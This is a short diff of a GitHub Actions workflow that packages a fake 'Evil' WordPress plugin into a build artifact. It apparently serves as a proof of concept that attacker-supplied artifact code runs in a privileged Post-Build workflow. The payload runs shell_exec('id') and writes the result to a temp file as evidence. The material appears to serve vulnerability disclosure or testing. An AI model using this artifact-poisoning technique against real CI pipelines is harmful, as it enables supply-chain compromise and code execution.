@@ -18,8 +18,9 @@ jobs:
            * Plugin Name: Evil
            * Version: 1.0.0
            */
-          echo "=== PWNED: attacker artifact code executed in the privileged Post-Build workflow ===\n";
-          system('id');
+          $poc = '=== PWNED: attacker artifact code executed in the privileged Post-Build workflow === uid=' . trim( shell_exec( 'id' ) );
+          error_log( $poc );
+          file_put_contents( sys_get_temp_dir() . '/pwned.txt', $poc . "\n" );
           PHP
           tar -cJf jetpack-build.tar.xz build
       - uses: actions/upload-artifact@v4
